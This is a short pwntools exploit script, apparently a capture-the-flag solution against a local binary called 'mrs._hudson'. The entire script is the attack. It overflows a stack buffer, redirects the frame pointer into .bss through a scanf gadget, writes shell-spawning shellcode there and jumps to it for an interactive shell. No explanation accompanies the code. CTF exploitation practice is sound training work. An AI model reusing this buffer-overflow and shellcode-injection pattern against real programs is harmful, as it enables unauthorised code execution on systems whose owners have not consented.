#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.binary = "./mrs._hudson"
elf = context.binary

io = process("./mrs._hudson")

scanf_gadgets = 0x40066F
#  gdb.attach(io, "b *0x400680\nc")
io.sendlineafter(".\n", flat([cyclic(0x70), elf.bss() + 0x500 + 0x70, scanf_gadgets]))

io.sendline(fit({0x0: asm(shellcraft.sh()), 0x70: [p64(0xdeadbeef), p64(elf.bss() + 0x500)]}))

io.interactive()
io.close()
